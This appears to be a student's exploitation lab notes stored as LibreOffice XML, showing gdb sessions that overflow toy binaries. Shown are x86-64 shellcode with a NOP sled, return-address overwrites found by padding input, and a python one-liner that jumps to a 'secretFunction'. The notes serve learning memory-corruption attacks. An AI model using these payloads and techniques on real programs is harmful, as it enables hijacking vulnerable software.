      <text:p text:style-name="P12">Starting program: /ad/eng/users/z/h/zhangjn/Desktop/you/attackMe "$(python -c 'print "\x90" * 51 + <text:soft-page-break/>"\xeb\x29\x48\x31\xdb\xb3\x0e\x48\x31\xf6\x5e\x48\x31\xc0\xb0\x01\x48\x31\xff\x40\xb7\x01\x48\x31\xd2\xb2\x15\x0f\x05\xfe\xcb\x75\xea\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xd2\xff\xff\xff\x59\x6f\x75\x27\x76\x65\x5f\x62\x65\x65\x6e\x5f\x68\x61\x63\x6b\x65\x64\x21\x0a\x0d" + "<text:span text:style-name="T8">\x10\xdf\xff\xff\xff\x7f</text:span>"')"</text:p>
      <text:p text:style-name="P12">����������������������������������������������������)H1۳H1�^H1��#H1�@�#H1Ҳ#��u�H1��&lt;H1������You've_been_hacked!</text:p>
      <text:p text:style-name="P12">#����</text:p>
      <text:p text:style-name="P12">You've_been_hacked!</text:p>
      <text:p text:style-name="P12">You've_been_hacked!</text:p>
      <text:p text:style-name="P12">You've_been_hacked!</text:p>
      <text:p text:style-name="P12">You've_been_hacked!</text:p>
      <text:p text:style-name="P12">You've_been_hacked!</text:p>
      <text:p text:style-name="P12">You've_been_hacked!</text:p>
      <text:p text:style-name="P12">You've_been_hacked!</text:p>
      <text:p text:style-name="P12">You've_been_hacked!</text:p>
      <text:p text:style-name="P12">You've_been_hacked!</text:p>
      <text:p text:style-name="P12">You've_been_hacked!</text:p>
      <text:p text:style-name="P12">You've_been_hacked!</text:p>
      <text:p text:style-name="P12">You've_been_hacked!</text:p>
      <text:p text:style-name="P12">You've_been_hacked!</text:p>
      <text:p text:style-name="P12">You've_been_hacked!</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12">Program exited normally.</text:p>
      <text:p text:style-name="P12">Missing separate debuginfos, use: debuginfo-install glibc-2.12-1.192.el6.x86_64 libgcc-4.4.7-17.el6.x86_64 libstdc++-4.4.7-17.el6.x86_64</text:p>
      <text:p text:style-name="P16">(gdb) r </text:p>
      <text:p text:style-name="P7">Starting program: /ad/eng/users/z/h/zhangjn/Desktop/you/vuln A</text:p>
      <text:p text:style-name="P7">Enter some text:</text:p>
      <text:p text:style-name="P7">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</text:p>
      <text:p text:style-name="P7">You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Program received signal SIGSEGV, Segmentation fault.</text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T8">0x080484b2</text:span> in main ()</text:p>
      <text:p text:style-name="P7">Missing separate debuginfos, use: debuginfo-install glibc-2.12-1.192.el6.i686</text:p>
      <text:p text:style-name="P7">(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</text:p>
      <text:p text:style-name="P7">The program being debugged has been started already.</text:p>
      <text:p text:style-name="P7">Start it from the beginning? (y or n) y</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Starting program: /ad/eng/users/z/h/zhangjn/Desktop/you/vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</text:p>
      <text:p text:style-name="P7">Enter some text:</text:p>
      <text:p text:style-name="P7">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</text:p>
      <text:p text:style-name="P7">You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Program received signal SIGSEGV, Segmentation fault.</text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T8">0x6ffffef5</text:span> in ?? ()</text:p>
      <text:p text:style-name="P7">(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</text:p>
      <text:p text:style-name="P7">The program being debugged has been started already.</text:p>
      <text:p text:style-name="P7">Start it from the beginning? (y or n) y</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Starting program: /ad/eng/users/z/h/zhangjn/Desktop/you/vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</text:p>
      <text:p text:style-name="P7">Enter some text:</text:p>
      <text:p text:style-name="P7">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</text:p>
      <text:p text:style-name="P7">You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Program received signal SIGSEGV, Segmentation fault.</text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T8">0x41414141</text:span> in ?? ()</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Compare these and see how can you exactly overwrite these numbers</text:p>
      <text:p text:style-name="P7">Then change whatever you want to overwrite to it</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P6">(gdb) disassemble secretFunction</text:p>
      <text:p text:style-name="P6">Dump of assembler code for function secretFunction:</text:p>
      <text:p text:style-name="P6"><text:s text:c="3"/><text:span text:style-name="T8">0x08048444</text:span> &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="P6"><text:s text:c="3"/>0x08048445 &lt;+1&gt;:<text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="P6"><text:s text:c="3"/>0x08048447 &lt;+3&gt;:<text:tab/>sub <text:s text:c="3"/>$0x18,%esp</text:p>
      <text:p text:style-name="P6"><text:s text:c="3"/>0x0804844a &lt;+6&gt;:<text:tab/>movl <text:s text:c="2"/>$0x8048584,(%esp)</text:p>
      <text:p text:style-name="P6"><text:s text:c="3"/>0x08048451 &lt;+13&gt;:<text:tab/>call <text:s text:c="2"/>0x8048374 &lt;puts@plt&gt;</text:p>
      <text:p text:style-name="P6"><text:s text:c="3"/>0x08048456 &lt;+18&gt;:<text:tab/>movl <text:s text:c="2"/>$0x8048598,(%esp)</text:p>
      <text:p text:style-name="P6"><text:s text:c="3"/>0x0804845d &lt;+25&gt;:<text:tab/>call <text:s text:c="2"/>0x8048374 &lt;puts@plt&gt;</text:p>
      <text:p text:style-name="P6"><text:s text:c="3"/>0x08048462 &lt;+30&gt;:<text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="P6"><text:s text:c="3"/>0x08048463 &lt;+31&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="P6">End of assembler dump.</text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T11">32</text:span>chars will segfault</text:p>
      <text:p text:style-name="P6">bash-4.1$ python -c 'print "\x90" * <text:span text:style-name="T11">32</text:span> + "\<text:span text:style-name="T8">x44\x84\x04\x08</text:span>"'|./vuln</text:p>
      <text:p text:style-name="P6">Enter some text:</text:p>
      <text:p text:style-name="P6">You entered: ��������������������������������D�#</text:p>
      <text:p text:style-name="P6">Congratulations!</text:p>
      <text:p text:style-name="P6">You have entered in the secret function!</text:p>
      <text:p text:style-name="P6">Segmentation fau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ang </meta:initial-creator>
    <meta:creation-date>2016-12-19T17:41:31.462160033</meta:creation-date>
    <dc:date>2016-12-19T22:06:30.288977529</dc:date>
    <dc:creator>Zhang </dc:creator>
    <meta:editing-duration>PT38M3S</meta:editing-duration>
    <meta:editing-cycles>5</meta:editing-cycles>
    <meta:generator>LibreOffice/4.3.7.2$Linux_X86_64 LibreOffice_project/430$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="7" meta:paragraph-count="260" meta:word-count="1285" meta:character-count="13544" meta:non-whitespace-character-count="12163"/>
  </office:meta>
</office:document-meta>
</file>